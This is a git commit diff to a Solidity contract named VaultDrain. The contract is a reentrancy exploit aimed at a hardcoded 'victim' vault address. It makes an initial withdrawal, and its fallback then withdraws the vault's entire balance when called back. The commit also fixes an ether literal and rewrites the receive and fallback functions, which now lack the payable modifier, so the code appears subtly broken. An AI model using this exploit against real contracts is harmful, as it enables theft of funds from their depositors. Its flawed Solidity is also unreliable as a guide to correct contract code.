ea2486b1fa730c1cfb9df088f86cdae95b2e9d47
cosmicsplendor <ufocalypse@gmail.com>
2026-06-09 13:31:07 +0545

    Update VaultDrain.sol

--- src/VaultDrain.sol
+++ src/VaultDrain.sol
@@ -4,13 +4,14 @@ interface Vault {
     function withdraw(uint256 _amount) external;
 }
 
-contract VaultDrain {
+contract VaultDrain { // 0x9ef331424698F02345E5291EC6c4C6Bb00c74Df9
     address public immutable victim = 0xcf76B6324A20a432eb695ABDd5820bfBcdd34Bfd;
-    uint256 internal constant INITIAL_WITHDRAWAL = 0.1eth;
+    uint256 internal constant INITIAL_WITHDRAWAL = 0.1 ether;
     function attack() public {
         Vault(victim).withdraw(INITIAL_WITHDRAWAL);
     }
-    function fallback() public {
+    receive() external { }
+    fallback() external {
         Vault(victim).withdraw(address(victim).balance);
     }
 }
